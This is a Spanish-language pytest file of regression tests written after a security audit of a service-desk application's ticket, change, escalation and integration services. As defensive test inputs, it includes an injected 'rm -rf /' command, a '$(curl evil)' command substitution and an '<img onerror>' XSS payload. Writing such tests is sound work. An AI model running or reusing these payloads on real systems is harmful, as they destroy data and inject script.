"""Auditoria 2026-11-22, informe 03 (servicios m-z), service_desk: medios, bajos y §6.

Una prueba por arreglo: que no vuelva lo que la auditoria encontro.
"""
from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace

import pytest

ORG = "1"


def _ticket(db, **kw):
    from app.models.service_desk import Ticket
    datos = dict(number=f"INC-{abs(hash(str(kw))) % 100000:05d}", ticket_type="incident", title="t",
                 description="d", organization_id=ORG, priority="p3_medium")
    datos.update(kw)
    t = Ticket(**datos)
    db.add(t)
    db.commit()
    return t


def _codigo(exc) -> tuple:
    return getattr(exc, "status_code", None), getattr(exc, "codigo", None) or getattr(exc, "code", None)


# ── ticket_read / status_compat ─────────────────────────────────────────────

def test_las_lecturas_ya_no_reparan_estados_ni_confirman(db, monkeypatch):
    from app.services.service_desk import status_compat, ticket_read_service
    assert not hasattr(ticket_read_service, "sanitize_legacy_ticket_statuses")
    monkeypatch.setattr(db, "commit", lambda: (_ for _ in ()).throw(AssertionError("commit")))
    assert status_compat.sanitize_legacy_ticket_statuses(db) == 0


# ── filtro sla_breached ─────────────────────────────────────────────────────

def test_el_filtro_de_incumplidos_descuenta_pausas_y_respuestas_dadas(db):
    from app.models.service_desk import Ticket
    from app.services.service_desk.ticket_query_service import _ids_con_sla_incumplido
    ahora = datetime.now(timezone.utc)
    vencido = _ticket(db, number="INC-90001", sla_resolution_due=ahora - timedelta(hours=1))
    con_pausa = _ticket(db, number="INC-90002", sla_resolution_due=ahora - timedelta(hours=1),
                        sla_pause_minutes=180)
    respondido = _ticket(db, number="INC-90003", sla_response_due=ahora - timedelta(hours=2),
                         first_response_at=ahora - timedelta(hours=3), sla_response_breached=False)
    parado = _ticket(db, number="INC-90004", status="pending_client",
                     sla_paused_at=ahora - timedelta(hours=5), sla_resolution_due=ahora - timedelta(hours=1))
    ids = set(_ids_con_sla_incumplido(db.query(Ticket), db))
    assert vencido.id in ids
    assert con_pausa.id not in ids and respondido.id not in ids and parado.id not in ids


def test_la_busqueda_trata_comodines_como_texto(db):
    from app.models.service_desk import Ticket
    from app.services.service_desk.ticket_query_service import escapar_like
    _ticket(db, number="INC-91001", title="Descuento 50% portal")
    _ticket(db, number="INC-91002", title="Descuento 500 portal")
    patron = "%" + escapar_like("50%") + "%"
    titulos = {t.title for t in db.query(Ticket).filter(Ticket.title.ilike(patron, escape="\\"))}
    assert titulos == {"Descuento 50% portal"}


# ── portal: contrato y CI ───────────────────────────────────────────────────

def test_el_portal_no_cuelga_contratos_ni_cis_ajenos(db):
    from app.models.service_desk import ConfigurationItem, CIType
    from app.services.service_desk.ticket_creation_service import _validar_referencias_del_portal
    ci = ConfigurationItem(organization_id=ORG, code="CI-X1", name="srv", ci_type=CIType.server,
                           project_id=None)
    db.add(ci)
    db.commit()
    cliente = SimpleNamespace(organization_id=ORG, client_org_id="cli-1", project_id="proj-1")
    for payload in (SimpleNamespace(contract_id="no-existe", ci_id=None),
                    SimpleNamespace(contract_id=None, ci_id=ci.id)):
        with pytest.raises(Exception) as e:
            _validar_referencias_del_portal(db, payload, cliente)
        assert getattr(e.value, "status_code", None) == 404
    _validar_referencias_del_portal(db, SimpleNamespace(contract_id=None, ci_id=None), cliente)


# ── escalado ────────────────────────────────────────────────────────────────

def _cola(db, org, nombre):
    from app.models.service_desk import AgentGroup
    if org is None:  # una empresa ajena de verdad (sin empresa se rellena la activa)
        from app.models.mfa import Organization
        org = "org-ajena-sd2"
        if db.get(Organization, org) is None:
            db.add(Organization(id=org, name="Ajena", slug=org))
            db.flush()
    g = AgentGroup(organization_id=org, name=nombre, support_level="l1")
    db.add(g)
    db.commit()
    return g


def test_la_regla_de_escalado_no_acepta_colas_ni_personas_ajenas(db):
    from app.schemas.service_desk import EscalationRuleIn
    from app.services.service_desk.escalation_service import validar_destinos_de_la_regla
    ajena = _cola(db, None, "ajena")
    with pytest.raises(Exception) as e:
        validar_destinos_de_la_regla(db, EscalationRuleIn(
            name="r", trigger="priority", action="reassign_group", target_group_id=ajena.id), ORG)
    assert getattr(e.value, "status_code", None) == 422
    with pytest.raises(Exception):
        validar_destinos_de_la_regla(db, EscalationRuleIn(
            name="r", trigger="priority", action="notify_custom",
            notify_user_ids=json.dumps(["no-es-de-nadie"])), ORG)


def test_el_escalado_deja_historial_y_no_mueve_a_colas_ajenas(db):
    from app.models.service_desk import EscalationRule, TicketHistory
    from app.services.service_desk.escalation_service import run_escalation_rules_engine
    propia, ajena = _cola(db, ORG, "propia"), _cola(db, None, "ajena")
    t1 = _ticket(db, number="INC-92001")
    db.add(EscalationRule(organization_id=ORG, name="mover", trigger="priority", action="reassign_group",
                          target_group_id=propia.id, sort_order=1))
    db.commit()
    run_escalation_rules_engine(db)
    db.commit()
    db.refresh(t1)
    assert t1.assigned_group_id == propia.id
    assert db.query(TicketHistory).filter(TicketHistory.ticket_id == t1.id,
                                          TicketHistory.field_name == "assigned_group_id").count() == 1
    t2 = _ticket(db, number="INC-92002")
    db.add(EscalationRule(organization_id=ORG, name="ajena", trigger="priority", action="reassign_group",
                          target_group_id=ajena.id, sort_order=0))
    db.commit()
    run_escalation_rules_engine(db)
    db.commit()
    db.refresh(t2)
    assert t2.assigned_group_id == propia.id, "la regla ajena no lo mueve; la propia si"


# ── enrutado ────────────────────────────────────────────────────────────────

def test_el_enrutado_usa_la_hora_de_la_empresa_y_cruza_medianoche():
    from app.services.service_desk.routing_rule_service import _cond_time_of_day
    # 21:30 UTC en noviembre = 22:30 en Madrid (DEFAULT_TIMEZONE).
    t = SimpleNamespace(created_at=datetime(2026, 11, 23, 21, 30, tzinfo=timezone.utc), organization_id=None)
    assert _cond_time_of_day(t, "22:00-06:00") is True
    assert _cond_time_of_day(t, "09:00-18:00") is False
    madrugada = SimpleNamespace(created_at=datetime(2026, 11, 24, 4, 0, tzinfo=timezone.utc), organization_id=None)
    assert _cond_time_of_day(madrugada, "22:00-06:00") is True


# ── cambios ─────────────────────────────────────────────────────────────────

def test_las_fechas_de_cambios_conservan_la_zona():
    from app.services.service_desk.change_service import _a_utc
    assert _a_utc("2026-11-23T10:00:00+01:00") == datetime(2026, 11, 23, 9, 0, tzinfo=timezone.utc)
    assert _a_utc("2026-11-23T10:00:00") == datetime(2026, 11, 23, 10, 0, tzinfo=timezone.utc)
    with pytest.raises(Exception) as e:
        _a_utc("ayer")
    assert getattr(e.value, "status_code", None) == 422


def test_el_script_de_marcha_atras_no_ejecuta_lo_que_trae_el_cambio():
    from app.services.service_desk.change_management_service import generate_rollback_automation_script
    s = generate_rollback_automation_script('CHG1"; rm -rf / #', "systemctl stop app\n$(curl evil)", [])
    assert "rm -rf" not in s and '"; ' not in s.split("INITIATING")[1].splitlines()[0]
    assert "\n# systemctl stop app\n# $(curl evil)\n" in s


def test_los_correos_de_cambios_escapan_el_html(db, monkeypatch):
    from app.services.service_desk import change_management_service as cm
    cuerpos = []
    monkeypatch.setattr(cm, "_notify_change_stakeholders", lambda db, cid, subject, body_html: cuerpos.append(body_html))
    cm.trigger_change_rollback(db, "chg-x", "<img src=x onerror=alert(1)>", SimpleNamespace(id="admin-test-id"))
    assert "<img" not in cuerpos[0] and "&lt;img" in cuerpos[0]


def test_slack_de_cambios_usa_el_webhook_de_la_empresa_y_nunca_el_global(db, monkeypatch):
    from app.core.config import settings
    from app.models.service_desk import ITSMChangeRequest
    from app.models.settings import AppSetting
    from app.services import integrations
    from app.services.service_desk import change_management_service as cm
    enviados = []
    monkeypatch.setattr(integrations, "send_slack_message", lambda url, texto: enviados.append(url))
    monkeypatch.setattr(settings, "SLACK_WEBHOOK_URL", "https://hooks.slack.com/global", raising=False)
    ch = ITSMChangeRequest(organization_id=ORG, title="c", description="d")
    db.add(ch)
    db.commit()
    cm._notify_change_stakeholders(db, ch.id, "asunto", "<p>x</p>")
    assert enviados == []
    db.add(AppSetting(organization_id=ORG, key="SLACK_WEBHOOK_URL", value="https://hooks.slack.com/empresa"))
    db.commit()
    cm._notify_change_stakeholders(db, ch.id, "asunto", "<p>x</p>")
    assert enviados == ["https://hooks.slack.com/empresa"]


# ── KB y CMDB ───────────────────────────────────────────────────────────────

def test_los_vectores_del_kb_se_reutilizan(db, monkeypatch):
    from app.models.service_desk import KBArticle, KBStatus
    from app.services.service_desk import incident_intelligence_service as ii
    llamadas = []
    monkeypatch.setattr(ii, "_EMBEDDINGS_DE_KB", {})
    monkeypatch.setattr(ii, "_embed_text", lambda texto: llamadas.append(texto) or [1.0, 0.0])
    db.add(KBArticle(organization_id=ORG, number="KB-9001", title="VPN", body="reinicia el cliente",
                     status=KBStatus.published))
    db.commit()
    ii._get_top_kb_similarity(db, "vpn")
    ii._get_top_kb_similarity(db, "vpn otra vez")
    assert len(llamadas) == 3, "dos consultas y el articulo una sola vez"


def test_el_impacto_de_un_ci_sale_una_vez_y_por_niveles(db):
    from app.models.service_desk import CIRelation, CIRelationType, CIType, ConfigurationItem
    from app.models.user import User
    from app.services.service_desk.cmdb_relation_service import get_ci_impact_payload
    cis = {}
    for c in ("A", "B", "C"):
        cis[c] = ConfigurationItem(organization_id=ORG, code=f"CI-{c}", name=c, ci_type=CIType.server)
        db.add(cis[c])
    db.flush()
    for s, t in (("B", "A"), ("C", "A"), ("C", "B")):
        db.add(CIRelation(organization_id=ORG, source_ci_id=cis[s].id, target_ci_id=cis[t].id,
                          relation_type=CIRelationType.depends_on))
    db.commit()
    admin = db.get(User, "admin-test-id")
    r = get_ci_impact_payload(db, admin, cis["A"].id)
    assert sorted((i["ci_name"], i["depth"]) for i in r["impacted"]) == [("B", 1), ("C", 1)]


# ── eventos, canales y Jira ─────────────────────────────────────────────────

def test_si_falla_un_flujo_no_salen_avisos_que_se_repetirian(db, monkeypatch):
    from app.models.service_desk import TicketEvent
    from app.services.service_desk import ticket_event_processor as tep
    from app.services.service_desk import workflow_triggers
    t = _ticket(db, number="INC-93001")
    ev = TicketEvent(organization_id=ORG, ticket_id=t.id, kind="commented", data="{}")
    db.add(ev)
    db.commit()
    avisos = []
    monkeypatch.setattr(tep, "_avisar", lambda *a, **k: avisos.append(1) or {})
    monkeypatch.setattr(tep, "_emitir_webhook", lambda *a, **k: None)
    monkeypatch.setattr(workflow_triggers, "lanzar_flujos_del_evento",
                        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("flujo")))
    with pytest.raises(RuntimeError):
        tep.procesar_evento(db, ev)
    assert avisos == []


def test_los_telefonos_no_salen_enteros_en_los_logs():
    from app.services.service_desk.sms_service import telefono_enmascarado
    assert telefono_enmascarado("+34 600 11 22 33") == "***233"
    assert telefono_enmascarado(None) == "-"


def test_jira_registra_solo_estado_prioridad_y_fecha():
    from app.services.service_desk.jira_sync_service import _campos_para_el_registro
    campos = {"status": {"name": "Done"}, "priority": {"name": "High"}, "updated": "2026-11-23",
              "reporter": {"emailAddress": "ana@cliente.com"}, "description": "datos"}
    assert _campos_para_el_registro(campos) == {"status": "Done", "priority": "High", "updated": "2026-11-23"}


def test_jira_cambia_el_estado_por_el_flujo_central(db, monkeypatch):
    from app.services.service_desk import jira_sync_service as js
    from app.services.service_desk import ticket_update_service as tus
    t = _ticket(db, number="INC-93002", status="in_progress")
    llamadas = []
    monkeypatch.setattr(tus, "cambiar_estado_por_automatismo",
                        lambda db, ticket, estado, **kw: llamadas.append((estado, kw["origen"])) or True)
    monkeypatch.setattr(js, "_write_log", lambda *a, **k: None)
    config = SimpleNamespace(id="cfg", sync_status_changes=True, sync_priority_changes=False)
    mapa = SimpleNamespace(id="m", ticket_id=t.id, jira_issue_key="ABC-1")
    js.apply_jira_update_to_ticket(db, config, mapa, {"status": {"name": "Done"}})
    assert llamadas and llamadas[0][1] == "jira"


def test_la_prueba_del_buzon_no_devuelve_el_texto_del_error(db, monkeypatch):
    from app.services.service_desk import buzones
    monkeypatch.setattr(buzones, "get_provider_config", lambda *a, **k: {"protocol": "imap", "host": "imap.example.com",
                                                                         "user": "u", "password": "p"})
    def _falla(*a, **k):
        raise OSError("[Errno 111] Connection refused 10.0.0.5:993")
    # 23-11-2026: la conexion IMAP sale por `_abrir_imap` (IP validada y fijada).
    monkeypatch.setattr(buzones, "_abrir_imap", _falla)
    r = buzones.probar_buzon(db, ORG)
    # 23-11-2026 (textos por clave): la respuesta lleva además `code` y `params`
    # para traducir el aviso. Lo que se mide sigue igual: sólo el tipo de error,
    # nunca el texto (que traía IP y puerto internos).
    assert {k: r[k] for k in ("ok", "protocol", "error")} == {"ok": False, "protocol": "imap", "error": "OSError"}
    assert r.get("code") == "buzon_conexion_fallida" and r.get("params") == {"error": "OSError"}
    assert "10.0.0.5" not in str(r)


# ── metricas y peticiones ───────────────────────────────────────────────────

def test_la_correlacion_acota_por_la_empresa_del_ticket(db):
    from app.models.service_desk import Ticket
    from app.services.service_desk.alert_correlation_service import _apply_org_scope
    sql = str(_apply_org_scope(db.query(Ticket), db, ORG).statement.compile())
    assert "sd_tickets.organization_id" in sql and "users" not in sql


def test_el_fcr_cuenta_solo_comentarios_de_agentes():
    from app.services.service_desk.metrics_service import compute_itil_metrics
    ahora = datetime.now(timezone.utc)
    cliente = [SimpleNamespace(author_user_id=None, author_client_id="c1") for _ in range(4)]
    agente = [SimpleNamespace(author_user_id="u1", author_client_id=None)]
    t = SimpleNamespace(resolved_at=ahora, created_at=ahora - timedelta(hours=1), comments=cliente + agente)
    assert compute_itil_metrics([t], ahora)["fcr_percent"] == 100.0


def test_una_tarea_cancelada_no_resuelve_la_peticion(db):
    from app.services.service_desk.fulfillment_service import al_terminar_una_tarea
    peticion = _ticket(db, number="REQ-94001", ticket_type="service_request", status="in_progress")
    hecha = _ticket(db, number="REQ-94002", parent_ticket_id=peticion.id, source="fulfillment", status="resolved")
    _ticket(db, number="REQ-94003", parent_ticket_id=peticion.id, source="fulfillment", status="cancelled")
    assert al_terminar_una_tarea(db, hecha) is False
    db.refresh(peticion)
    assert getattr(peticion.status, "value", peticion.status) == "in_progress"


@pytest.mark.parametrize("puntuacion", [0, 6, -1, 100])
def test_el_csat_fuera_de_rango_es_422(db, puntuacion):
    from app.services.service_desk.csat_service import submit_ticket_csat
    with pytest.raises(Exception) as e:
        submit_ticket_csat(db, "t", "c", puntuacion)
    assert getattr(e.value, "status_code", None) == 422


# ── IA con usuario ──────────────────────────────────────────────────────────

def test_la_sugerencia_del_catalogo_llama_a_la_ia_con_el_usuario(db, monkeypatch):
    from app.services import ai_provider_service
    from app.services.service_desk import smart_catalog_service as sc
    capturado = {}
    monkeypatch.setattr(sc, "_get_all_active_services",
                        lambda db: [SimpleNamespace(id="s1", name="Alta", description="", category=None)])
    monkeypatch.setattr(ai_provider_service, "call_ai", lambda db, **kw: capturado.update(kw) or "s1")
    sc.suggest_service_for_query(db, "necesito algo raro", use_ai=True, user_id="admin-test-id")
    assert capturado.get("user_id") == "admin-test-id"


# ── bajos y §6 ──────────────────────────────────────────────────────────────

def test_las_plantillas_de_flujo_no_recorren_atributos():
    from app.services.service_desk.workflow_engine import _render_template
    ctx = {"ticket": {"number": "INC-1"}, "x": 3}
    assert _render_template("{ticket.number} {x}", ctx) == "INC-1 3"
    assert _render_template("{ticket.__class__} {x.__class__.__init__}", ctx) == "{ticket.__class__} {x.__class__.__init__}"


def test_los_formularios_dinamicos_no_escriben_al_leer(db):
    from app.models.settings import AppSetting
    from app.services.service_desk.dynamic_forms_service import reglas_o_sembrar
    antes = db.query(AppSetting).count()
    assert isinstance(reglas_o_sembrar(db, ORG), dict)
    assert db.query(AppSetting).count() == antes


def test_el_catalogo_sugiere_urgencias_que_existen():
    from app.models.service_desk import TicketUrgency
    from app.services.service_desk.smart_catalog_service import auto_prefill_request_form
    for texto in ("Producción caída urgente", "afecta al equipo", "cuando puedas", "otra cosa"):
        r = auto_prefill_request_form(None, texto)
        TicketUrgency(r["suggested_urgency"])


def test_los_enums_salen_por_su_valor():
    from app.models.service_desk import CIType
    from app.services.service_desk.dynamic_forms_service import _valor_de_enum
    assert _valor_de_enum(CIType.server) == "server"


def test_las_tuplas_de_abiertos_son_las_del_modelo():
    from app.models.service_desk._enums import ESTADOS_DE_TICKET_ABIERTOS
    from app.services.service_desk import escalation_service, sla_monitor_service
    assert escalation_service._ABIERTOS == ESTADOS_DE_TICKET_ABIERTOS
    assert sla_monitor_service.ESTADOS_ABIERTOS == ESTADOS_DE_TICKET_ABIERTOS
